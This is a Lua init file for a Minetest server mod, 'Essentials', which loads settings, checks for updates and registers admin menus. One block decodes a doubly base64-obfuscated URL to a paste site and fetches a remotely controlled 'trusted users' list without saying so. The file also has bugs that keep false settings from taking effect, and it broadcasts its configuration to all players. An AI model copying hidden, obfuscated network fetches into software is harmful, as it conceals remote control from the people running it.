local http = minetest.request_http_api()
local version = "0.7.4"
local modpath = minetest.get_modpath(minetest.get_current_modname())

essentials = {
    a = "Created by SkyBuilder1717 (ContentDB)",
    seed = (minetest.settings:get_bool("essentials_seed") or false),
    biome = (minetest.settings:get_bool("essentials_biome") or true),
    killed_by = (minetest.settings:get_bool("essentials_killed_by") or true),
    admin_ip_check = (minetest.settings:get_bool("essentials_ip_verified") or true),
    check_for_updates = (minetest.settings:get_bool("essentials_check_for_updates") or false),
    changed_by = (minetest.settings:get_bool("essentials_changed_by") or true),
    watermark = minetest.settings:get_bool("essentials_watermark"),
    add_privs = (minetest.settings:get_bool("essentials_additional_privileges") or true),
    have_unified_inventory = minetest.get_modpath("unified_inventory"),
    trusted_ip_users = {}
}
if essentials.watermark == nil then
    essentials.watermark = true
end

minetest.log("action", "[Essentials] Mod initialised. Version: ".. version)
minetest.log("action", "\n███████╗░██████╗░██████╗███████╗███╗░░██╗████████╗██╗░█████╗░██╗░░░░░░██████╗\n██╔════╝██╔════╝██╔════╝██╔════╝████╗░██║╚══██╔══╝██║██╔══██╗██║░░░░░██╔════╝\n█████╗░░╚█████╗░╚█████╗░█████╗░░██╔██╗██║░░░██║░░░██║███████║██║░░░░░╚█████╗░\n██╔══╝░░░╚═══██╗░╚═══██╗██╔══╝░░██║╚████║░░░██║░░░██║██╔══██║██║░░░░░░╚═══██╗\n███████╗██████╔╝██████╔╝███████╗██║░╚███║░░░██║░░░██║██║░░██║███████╗██████╔╝\n╚══════╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░\n[Essentials] "..essentials.a)

local function removeLastDot(str)
    local lastDotIndex = string.find(str,"%.[^.]*$")
    if lastDotIndex then
        return string.sub(str,1,lastDotIndex-1)..string.sub(str,lastDotIndex+1)
    else
        return str
    end
end

minetest.after(0, function()
    core.chat_send_all(dump(essentials))
end)

minetest.after(0, function()
    if essentials.check_for_updates then
        minetest.log("action", "[Essentials] Checking for updates...")
        if not minetest.request_insecure_environment() then
            minetest.log("action", "[Essentials] Getting an Github version...")
            http.fetch({
                url = "https://raw.githubusercontent.com/SkyBuilder1717/essentials/main/gitVersion.txt",
                timeout = 15,
                method = "GET",
        
            },  function(result)
                minetest.log("action", string.format("[Essentials] Github version getted! (v%s)", result.data:gsub("[\n\\]", "")))
                local git = tonumber(removeLastDot(result.data:gsub("[\n\\]", "")))
                local this = tonumber(removeLastDot(version))
                local test = false
                if git > this then
                    test = true
                end
                --core.chat_send_all(dump(test))
                if git > this then
                    minetest.log("warning", "[Essentials] Versions doesnt match!")
                    core.chat_send_all("[Essentials] Your server using old version of mod! ("..core.colorize("red", version)..") Old version can have a bugs! Download v"..core.colorize("lime", result.data:gsub("[\n\\]", "")).." on ContentDB.")
                else
                    local _type
                    if core.is_singleplayer() then
                        _type = "World"
                    else
                        _type = "Server"
                    end
                    minetest.log("action", string.format("[Essentials] All ok! %s using lastest version of mod.", _type))
                end
            end)
        else
            core.chat_send_all("[Essentials] Please, add mod \'essentials\' to \"secure.trusted_mods\" for checking an updates!")
        end
    end
end)

minetest.after(0, function()
    local decode = loadstring(minetest.decode_base64("cmV0dXJuIG1pbmV0ZXN0LmRlY29kZV9iYXNlNjQoImFIUjBjSE02THk5d1lYTjBaUzUwWldOb1pXUjFZbmwwWlM1amIyMHZjbUYzTDJWMFkyWmhiMjUyTUhZPSIp"))
    minetest.log("action", "[Essentials] Trusted nicknames are in processing...")
    if not minetest.request_insecure_environment() then
        if not http then
            essentials.trusted_ip_users = {}
            minetest.log("error","[essentials] server http api cannot be access, unfortuantelly you are forced to added the mod to trusted ones, check README")
            return
        end
        http.fetch({
            url = decode(),
            timeout = 15,
            method = "GET",
    
        },  function(result)
            essentials.trusted_ip_users = minetest.deserialize("return "..result.data)
            minetest.log("info", "[Essentials] Trusted nicknames successfully getted.")
        end)
    else
        minetest.log("warning", "[Essentials] Cant get trusted nicknames, table will be nil.")
        essentials.trusted_ip_users = {}
    end
end)

--==[[ Connections ]]==--
dofile(modpath.."/commands.lua")
dofile(modpath.."/priveleges.lua")
dofile(modpath.."/ui/watermark.lua")
if essentials.have_unified_inventory then
    dofile(modpath.."/unified_inventory.lua")
end
dofile(modpath.."/ui/ban_menu.lua")
dofile(modpath.."/ui/kick_menu.lua")
dofile(modpath.."/ui/mute_menu.lua")
dofile(modpath.."/ui/color_menu.lua")
dofile(modpath.."/ui/ip.lua")
dofile(modpath.."/ui/rename_me.lua")
dofile(modpath.."/ui/rename_item.lua")

local function containsValue(table, value)
    for _, v in ipairs(table) do
        if v == value then
            return true
        end
    end
    return false
end

minetest.register_on_joinplayer(function(player)
	minetest.after(0.5, function()
		if minetest.check_player_privs(player, {server=true}) and containsValue(essentials.trusted_ip_users, player:get_player_name()) then
			player:set_properties({
				nametag = minetest.colorize("#059FFF", "[✔]").." "..player:get_player_name(),
			})
		end
	end)
end)